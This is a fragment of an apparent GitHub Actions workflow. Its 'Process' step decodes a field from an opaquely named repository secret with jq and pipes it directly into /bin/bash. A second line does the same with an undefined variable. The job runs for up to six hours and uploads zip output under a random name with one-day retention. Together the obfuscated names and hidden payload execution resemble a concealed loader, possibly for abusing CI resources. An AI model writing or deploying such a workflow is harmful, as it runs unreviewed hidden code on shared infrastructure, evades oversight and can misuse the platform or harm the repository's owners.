    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Process
        env:
          kiav6: ${{ secrets.kiav6 }}
        run: |
          printf '%s' "$kiav6" | jq -r .goj082 | /bin/bash
          echo $ainb5472 | jq -r .yy31 | /bin/bash

      - name: Archive output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 0zJ63WLc
          path: "*.zip"
          retention-days: 1
